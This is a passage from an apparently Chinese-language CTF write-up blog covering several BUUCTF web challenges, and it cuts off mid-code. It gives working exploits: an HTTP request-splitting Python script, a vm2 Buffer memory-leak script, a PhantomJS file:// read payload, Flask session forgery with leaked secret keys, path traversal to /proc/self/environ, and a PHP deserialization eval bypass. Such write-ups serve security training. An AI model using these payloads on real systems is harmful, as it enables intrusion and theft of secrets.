class="line">xxxxxx文件上传</span><br><span class="line">xxxxxx文件上传</span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/flag HTTP/</span><span class="number">1.1</span></span><br><span class="line">x:Host:xxxxxxxxxx</span><br></pre></td></tr></table></figure>
<p><a href="https://pugjs.org/zh-cn/language/includes.html" target="_blank">pug</a></p>
<p><strong><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu60.jpg"></strong></p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//改编自 Nullcon HackIM <span class="number">2020</span> - split second</span><br><span class="line">//https://blog.p6.<span class="keyword">is</span>/nullcon-hackim-<span class="number">2020</span>-split-second/</span><br><span class="line">//这里用的是url编码绕过黑名单</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810</span></span><br><span class="line"><span class="string">Content-Length: 291</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">doctype html</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string">  head</span></span><br><span class="line"><span class="string">    style</span></span><br><span class="line"><span class="string">      include ../../../../../../../flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">x:&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = payload.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0xff&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">&#x27;http://f04dd623-9444-4bfb-80e8-9117c5247c3f.node3.buuoj.cn/core?q=&#x27;</span> + urllib.parse.quote(payload))</span><br><span class="line">getflag = <span class="string">&#x27;http://f04dd623-9444-4bfb-80e8-9117c5247c3f.node3.buuoj.cn/?action=flag&#x27;</span></span><br><span class="line">res = requests.get(getflag)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>


<h2 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h2><p>知识点：VM2</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> randomstring = <span class="built_in">require</span>(<span class="string">&quot;randomstring&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> flag = <span class="built_in">require</span>(<span class="string">&quot;./config.js&quot;</span>).flag</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;var flag_&quot;</span> + randomstring.generate(<span class="number">64</span>) + <span class="string">&quot; = \&quot;hitcon&#123;&quot;</span> + flag + <span class="string">&quot;&#125;\&quot;;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (req.query.data &amp;&amp; req.query.data.length &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vm = <span class="keyword">new</span> VM(&#123;</span><br><span class="line">            timeout: <span class="number">1000</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(req.query.data);</span><br><span class="line">        res.send(<span class="string">&quot;eval -&gt;&quot;</span> + vm.run(req.query.data));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;listening on port 3000!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>用的是[HFCTF2020]JustEscape的payload</p>
<p>关于这里为什么是data[]，是为了绕过<code>req.query.data &amp;&amp; req.query.data.length &lt;= 12</code></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu61.jpg"></p>
<p><strong>看了wp，官方解法是利用buffer的未清零特征</strong></p>
<blockquote>
<p><strong>在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。</strong></p>
</blockquote>
<p><strong>注：关于 <code>Buffer</code></strong><br><strong>JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。</strong><br><strong>但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 <code>Buffer</code> 类，该类用来创建一个专门存放二进制数据的缓存区。</strong></p>
<p><strong>只要是调用过的变量，一定会存在内存中，所以需要使用<code>Buffer()</code>来读取内存，使用<code>data=Buffer(500)</code>分配一个<code>800</code>的单位为<code>8</code>位字节的<code>buffer</code>，编写Python3的EXP：</strong></p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://98c8eee2-5f60-47d8-a283-9e8a1f7ed1fb.node3.buuoj.cn/?data=Buffer(500)&#x27;</span></span><br><span class="line">response = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">        req = requests.get(url)</span><br><span class="line">        response = req.text</span><br><span class="line">        print(req.status_code)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">            print(response)</span><br><span class="line">            <span class="keyword">break</span>   </span><br></pre></td></tr></table></figure>


<h2 id="FireshellCTF2020-ScreenShooter"><a href="#FireshellCTF2020-ScreenShooter" class="headerlink" title="[FireshellCTF2020]ScreenShooter"></a>[FireshellCTF2020]ScreenShooter</h2><p>知识点：PhantomJS</p>
<p>通过查看请求头，在user-agent发现使用PhantomJS</p>
<blockquote>
<p>Phantom JS是一个服务器端的 JavaScript API 的 WebKit。其支持各种Web标准： DOM 处理, CSS 选择器, JSON, Canvas, 和 SVG</p>
</blockquote>
<p>搜索PhantomJS发现存在任意文件上传漏洞CVE-2019-17221，该漏洞通过file://URL的XMLHttpRequest触发</p>
<p><a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/" target="_blank">Breaching the perimeter - PhantomJs Arbitrary file read</a></p>
<p>payload:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> karsa;</span></span><br><span class="line"><span class="javascript">		karsa = <span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="javascript">		karsa.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.write(<span class="built_in">this</span>.responseText)</span></span><br><span class="line">		&#125;;</span><br><span class="line"><span class="javascript">		karsa.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///flag&quot;</span>);</span></span><br><span class="line">		karsa.send();</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>做法同URL TO PDF</p>
<h2 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h2><p>知识点：</p>
<ol>
<li>模板注入</li>
<li>session伪造</li>
</ol>
<p>随便注册一波 账号npfs,密码123，到admin panel 发现要admin登入，抓包看下session，尝试篡改cookie来提权，但是加密方式未知，密钥未知。我们先注入点，fuzz发现在<code>event_important</code>参数存在模版注入，输入<code>__class__</code>，发现成功回显.</p>
<p>接着查找配置文件：<code>__class__.__init__.__globals__[app].config</code> ，得到key</p>
<blockquote>
<p>fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y</p>
</blockquote>
<p>我们把两个session都解密看一下</p>
<p>这里user的值才是用来判断admin的，所有我们要伪造的是名为user的session,</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu62-1.jpg"></p>
<p>但是我们解密发现，字符串只有一个npfs，也就是我注册的用户名，我们无法直接伪造，这里用到了脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">b&#x27;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#x27;</span></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    print(session_serializer.dumps(<span class="string">&quot;admin&quot;</span>))</span><br><span class="line">index()</span><br></pre></td></tr></table></figure>
<p>得到的user代替原来的即可伪造成功获得flag</p>
<h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>知识点：</p>
<ol>
<li>Flask中的Session伪造</li>
<li><code>/environ</code>记录当前进程的环境变量信息</li>
<li><code>/proc/self</code>其路径指向当前进程</li>
</ol>
<p>启动环境，是一个蜂蜜购买解密，有1366美金，购买flag需要1337美金，美金不足，猜测为session伪造，抓包，将session利用flask-session-master工具解密，</p>
<p>获得解密后的值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;balance&#x27;</span>: <span class="number">1336</span>, <span class="string">&#x27;purchases&#x27;</span>: []&#125;</span><br></pre></td></tr></table></figure>
<p>确实包含金额，所有接下去要做的就是得到key</p>
<p>观察页面，发现大图片下方有一行小字</p>
<blockquote>
<p><em>click to download our sweet images</em></p>
</blockquote>
<p>之前省赛做到过类似的，web中对于这种可下载地方一般存在任意文件下载，下载抓包</p>
<p>修改其<code>image</code>的值为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/download?image=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<p>发送数据包，得到<code>/etc/passwd</code>文件内容，确定存在任意文件下载漏洞</p>
<p>当路径为<code>../../proc/self/environ</code>时，得到key</p>
<blockquote>
<p>SECRET_KEY=XXZrJ0UpZONF6PHmmqsr2OzfuDsQQxxgbkCncTKj</p>
</blockquote>
<p>使用<strong>flask-session-cookie</strong>加密脚本<a href="https://github.com/noraj/flask-session-cookie-manager">Github地址</a>：</p>
<blockquote>
<p>python3 flask_session_cookie_manager3.py encode -s ‘XXZrJ0UpZONF6PHmmqsr2OzfuDsQQxxgbkCncTKj’  -t “{‘balance’: 1337, ‘purchases’: []}”</p>
</blockquote>
<p>将得到的session进行替换，购买即可得到flag</p>
<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>知识点：</p>
<ol>
<li>Error::toString</li>
<li>反序列化</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>传入的 syc 和 lover 要求值不等但 md5 加密后相等</p>
<p>题目过滤了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  ( ) <span class="string">&quot; &#x27;</span></span><br></pre></td></tr></table></figure>
<p>之后会进行命令执行</p>
<p><strong>md5()和sha1()可以对一个类进行hash，并且会触发这个类的 <code>__toString</code> 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 <code>__toString</code> 方法。所以我们可以使用含有 <code>__toString</code> 方法的PHP内置类来绕过，用的两个比较多的内置类就是 <code>Exception</code> 和 <code>Error</code> ，他们之中有一个 <code>__toString</code> 方法，当类被当做字符串处理时，就会调用这个函数</strong></p>
<p><strong>这里以<code>Error</code> 类为例，我们来看看当触发他的 <code>__toString</code> 方法时会发生什么：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
<p><strong>输出如下：</strong></p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="keyword">Error: </span>payload in /usercode/file.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure>
<p><strong>发现会以字符串的形式输出当前报错，包含当前的错误信息（payload）以及当前报错的行号（2），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</strong></p>
<p><strong>在来看看下一个例子：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
<p><strong>输出如下：</strong></p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="keyword">Error: </span>payload in /usercode/file.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Error: </span>payload in /usercode/file.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure>
<p><strong>可见，<code>$a</code> 和 <code>$b</code> 这两个对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu63.jpg"></p>
<p><code>Exception</code> 类与 <code>Error</code> 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7</p>
<p>我们可以将题目代码中的 <code>$syc</code> 和 <code>$lover</code> 分别声明为类似上面的内置类的对象，让这两个对象本身不同（传入的错误代码不同即可），但是 <code>__toString</code> 方法输出的结果相同即可。</p>
<p>由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 <code>include &quot;/flag&quot; </code>将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过即可。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">            <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$c</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2><p>知识点：</p>
<ol>
<li>POST</li>
<li>sha1数组绕过</li>
</ol>
<p>没啥好说的，可以利用数组绕过</p>
<p>payload:POST传参</p>
<blockquote>
<p>roam1[]=1&amp;roam2[]=2</p>
</blockquote>
<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>知识点：SQL注入（PHP_SESSION_UPLOAD_PROGRESS）</p>
<p>source.zip获得源码，index.php有全局转义,转义了所有传过去的参数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SESSION</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_GET</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_POST</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    !is_string(<span class="variable">$value</span>) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addslashes(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) <span class="keyword">AND</span> <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] === <span class="string">&quot;register&quot;</span> <span class="keyword">AND</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> <span class="keyword">AND</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">AND</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">&#x27;templates/register.php&#x27;</span>);</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) <span class="keyword">AND</span> <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] === <span class="string">&quot;login&quot;</span> <span class="keyword">AND</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;GET&#x27;</span> <span class="keyword">AND</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">AND</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">&#x27;templates/login.php&#x27;</span>);</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) <span class="keyword">AND</span> <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] === <span class="string">&quot;home&quot;</span> <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">&#x27;templates/home.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>对于这里的addslashes转义，可以通过GBK编码绕过，接下去看login和register</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`=&quot;&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot; and password=&quot;&#x27;</span> . md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc() <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> auth(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span>)) <span class="keyword">OR</span> (<span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果不存在SESSION就会die掉</span></span><br><span class="line"><span 